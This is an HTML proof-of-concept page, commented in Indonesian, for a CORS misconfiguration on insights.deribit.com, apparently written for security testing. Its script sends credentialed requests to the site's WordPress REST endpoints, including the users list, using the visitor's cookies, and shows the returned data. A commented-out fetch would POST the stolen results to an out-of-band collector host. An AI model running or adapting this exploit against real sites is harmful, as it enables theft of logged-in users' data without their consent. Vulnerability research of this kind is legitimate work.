<!DOCTYPE html>
<html>
<head>
    <title>CORS Vulnerability PoC - insights.deribit.com</title>
</head>
<body>
    <h1>CORS Misconfiguration PoC</h1>
    <p>Mengakses data dari insights.deribit.com dengan kredensial pengguna yang sedang login...</p>
    <div id="result">Loading...</div>

    <script>
        // Array endpoint yang akan dicoba akses
        const endpoints = [
            'https://insights.deribit.com/wp-json',
            'https://insights.deribit.com/wp-json/wp/v2/users',
            'https://insights.deribit.com/wp-json/wp/v2/posts'
        ];

        // Melakukan request ke semua endpoint
        Promise.all(endpoints.map(url => 
            fetch(url, {
                credentials: 'include' // Mengirimkan cookie pengguna jika ada
            })
            .then(response => {
                if (!response.ok) {
                    return { url, status: response.status, error: `Error: ${response.status}` };
                }
                return response.json().then(data => ({ url, status: response.status, data }));
            })
            .catch(error => ({ url, error: error.toString() }))
        ))
        .then(results => {
            const resultDiv = document.getElementById('result');
            let html = '<h2>CORS PoC Results:</h2>';
            
            results.forEach(result => {
                html += `<h3>${result.url}</h3>`;
                html += `<p>Status: ${result.status || 'Error'}</p>`;
                
                if (result.data) {
                    html += '<pre>' + JSON.stringify(result.data, null, 2).substring(0, 500) + '... (truncated)</pre>';
                } else if (result.error) {
                    html += `<p style="color: red">${result.error}</p>`;
                }
                html += '<hr>';
            });
            
            resultDiv.innerHTML = html;

            // Menambahkan exfiltration data untuk demo
            if (results.some(r => r.data)) {
                console.log("Exfiltrating data to attacker server would happen here");
                // Dalam PoC nyata, Anda bisa menambahkan kode untuk mengirim data ke server attacker
               // fetch('https://csxaipansspdddzbhzffraz5k2s7ug7r1.oast.fun/collect', { 
               //     method: 'POST',
              //      body: JSON.stringify(results)
              //   });
            }
        });
    </script>
</body>
</html>